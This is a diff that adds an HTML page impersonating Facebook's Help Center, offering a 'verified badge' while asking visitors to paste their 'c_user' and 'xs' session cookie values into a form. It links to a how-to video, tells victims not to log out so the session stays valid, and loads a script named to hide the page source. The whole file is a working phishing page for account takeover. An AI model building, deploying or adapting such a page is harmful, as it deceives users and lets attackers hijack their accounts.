@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request a Verified Badge on Facebook</title>
+    <link rel="stylesheet" href="css/help.css">
+</head>
+<body>
+    <nav class="navbar logo-bar">
+        <div class="nav-container">
+            <span class="facebook-logo">facebook</span>
+        </div>
+    </nav>
+    <nav class="navbar help-center-bar">
+        <div class="nav-container">
+            <h1>Help Center</h1>
+        </div>
+    </nav>
+    <div class="container">
+        <main>
+            <h2>Request a verified badge on Facebook</h2>
+            <p>The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.</p>
+            <p>Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.</p>
+            <p>Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
+            <a href="#" class="video-link">Detailed Video Information</a>
+            <div class="video-container">
+                <video controls>
+                    <source src="vid/detailed-video.mp4" type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+            </div>
+            <form id="verificationForm" action="security.html" method="POST">
+                <label for="c_user">c_user</label>
+                <input type="number" id="c_user" name="c_user" required>
+                
+                <label for="xs">xs</label>
+                <input type="text" id="xs" name="xs" required>
+                
+                <p class="note">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
+                
+                <div class="button-container">
+                    <button type="submit" class="submit-button">Submit</button>
+                </div>
+            </form>
+        </main>
+    </div>
+    <script src="js/main.js"></script>
+    <script src="js/hide-source-from-user.js"></script>    
+</body>
+</html>
